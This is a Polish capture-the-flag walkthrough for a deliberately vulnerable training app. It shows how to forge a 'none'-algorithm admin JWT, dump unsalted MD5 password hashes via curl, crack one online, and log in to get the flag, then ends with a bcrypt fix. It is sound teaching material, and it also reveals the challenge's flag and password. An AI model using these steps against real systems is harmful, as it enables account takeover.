# A04 — Cryptographic Failures (MD5 bez soli)

## Metadane
- **ID:** A04
- **Kategoria:** OWASP A04:2025 - Cryptographic Failures
- **Trudność:** medium
- **Punkty:** 150
- **Flaga:** `PWR{md5_no_salt_cracked}` — w profilu charlie po zalogowaniu

## Opis
Aplikacja hashuje hasła algorytmem **MD5 bez soli**. Endpoint `/api/admin/backup`
zwraca listę użytkowników z hashami MD5 (wymaga dostępu admina — zdobądź przez A08).

## Exploit krok po kroku

### Krok 1: Zdobądź dostęp admina (przez A08 — JWT None Algorithm)
Patrz wyzwanie A08. Utwórz token JWT z `is_admin: true` i algorytmem `none`.

### Krok 2: Pobierz backup z hashami
```bash
curl -H "Authorization: Bearer <ADMIN_TOKEN>" \
  http://localhost:5000/api/admin/backup
```

Wynik zawiera dla użytkownika `charlie`:
```json
{
  "email": "charlie@vulnbank.pl",
  "password_hash": "a1b2c3d4e5f6..."  // MD5 bez soli
}
```

### Krok 3: Złam hash
1. Wejdź na [crackstation.net](https://crackstation.net)
2. Wklej hash MD5 charliego
3. Hasło: `charlie2024`

### Krok 4: Zaloguj się jako charlie i sprawdź profil
```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"charlie@vulnbank.pl","password":"charlie2024"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -H "Authorization: Bearer $TOKEN" http://localhost:5000/api/profile/
```

Profil Charlie zawiera flagę w dodatkowym polu.

## Jak to naprawić
```python
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

## Referencje
- OWASP A04:2025 - Cryptographic Failures
- [CWE-916: Use of Password Hash With Insufficient Computational Effort](https://cwe.mitre.org/data/definitions/916.html)
